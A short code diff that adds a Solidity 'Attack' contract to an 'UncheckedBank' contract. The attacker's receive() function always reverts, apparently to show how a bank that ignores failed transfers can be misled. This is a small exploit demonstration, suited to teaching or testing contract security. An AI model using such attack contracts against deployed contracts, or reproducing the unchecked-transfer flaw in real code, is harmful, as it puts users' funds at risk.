@@ -17,3 +17,21 @@ contract UncheckedBank {
         return address(this).balance;
     }
 }
+contract Attack {
+    UncheckedBank public bank;
+    constructor(UncheckedBank _bank){
+        bank = _bank;
+    }
+    receive() external payable{
+        revert();
+    }
+    function deposit() external payable{
+        bank.deposit{value:msg.value}();
+    }
+    function withdraw() external payable{
+        bank.withdraw();
+    }
+    function getBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
+}
